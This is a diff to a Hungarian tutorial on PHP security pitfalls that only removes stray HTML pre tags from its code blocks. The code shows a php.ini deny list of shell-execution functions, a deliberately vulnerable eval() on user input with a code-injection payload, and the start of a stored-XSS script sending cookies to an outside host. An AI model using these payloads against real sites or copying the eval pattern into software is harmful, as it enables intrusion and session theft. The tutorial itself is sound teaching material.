@@ -98,7 +98,7 @@ Büszkén logoljuk, hogy a trolo nevű felhasználó belépett és utána jöhet
 NE, ismétlem **NE** használjunk exec() és passthru() függvényeket. Sőt, a php.ini fájlban ajánlott ki is kapcsolni őket, így nem lehet használni PHP környezetben azt.
 
 ```
-<pre data-language="shell">disable_functions = exec,passthru,eval,shell_exec,system,proc_open,popen,curl_exec, curl_multi_exec, parse_ini_file,show_source // itt szerepelnek mások is, de nem mindre fogok kitérni
+disable_functions = exec,passthru,eval,shell_exec,system,proc_open,popen,curl_exec, curl_multi_exec, parse_ini_file,show_source // itt szerepelnek mások is, de nem mindre fogok kitérni
 ```
 
 Ha mégis használni akarjuk valamilyen okból, akkor ezeket a stringeket az `escapeshellargs()` és `escapeshellcmd()` függvényekkel lehet helyretenni, ellenben továbbra is azt vallom, hogy ahol az `exec()` függvényre szükség van, ott valami gond van.
@@ -108,19 +108,19 @@ Ha mégis használni akarjuk valamilyen okból, akkor ezeket a stringeket az `es
 Szintén gyakorló életveszély kategória. A legtöbb ilyen probléma egyébként szimplán a fordítóprogramok adta lehetőségeket használja ki. Ehhez nem árt ismerni, hogy is működnek a fordítóprogramok, de ebben a cikkben semmiképp nem tudom kitárgyalni a dolgot. Itt hasonló a helyzet, kódot futtatunk, aminek egy részét a user szolgáltatta, csak ez esetben az `eval()` függvény a felelős a gaztettekért. Vegyük a következőt:
 
 ```
-<pre class="de1" data-language="php"> eval('echo "Te kis '+ $_POST['username'+ '!";');
+ eval('echo "Te kis '+ $_POST['username'+ '!";');
 ```
 
 Igen, elég láma példa, de szemléltetésnek megteszi. Ismét vicces felhasználónévvel jövünk elő:
 
 ```
-<pre data-language="php">"; phpinfo(); // "
+"; phpinfo(); // "
 ```
 
 Így a futtatott PHP kód a következőképp fog kinézni:
 
 ```
-<pre data-language="php">echo "Te kis "; phpinfo(); // "!";
+echo "Te kis "; phpinfo(); // "!";
 ```
 
 Bizony, ismét cs\*csre futottunk, kiírattunk mindent, amit a php/apache környezetről bárki tudni szeretne. Ugyanis hiába egy sorban vannak, a PHP fordításakor tokeneket képez és teljesen mindegy, hogy szóköz vagy enter választja el őket, amíg a pontosvesszővel lezártuk az előzőt.
@@ -158,7 +158,7 @@ Ennek kétféle módja van, perzisztens és nem perzisztens, ellenben a kettő k
 Vegyünk egy perzisztens fajtát. Jöjjön egy fórum, vagy blog, ahol a kommenteket a szerver direktben megjeleníti. Így ha valaki okos és ügyes, akkor a következő hozzászólással bizony ellophatja a sütijeinket:
 
 ```
-<pre data-language="javascript"><script type="text/javascript">
+<script type="text/javascript">
 $(document).ready(function(){
    myhost = myhost.com/got/your/cookie
    $.ajax({ host: myhost,
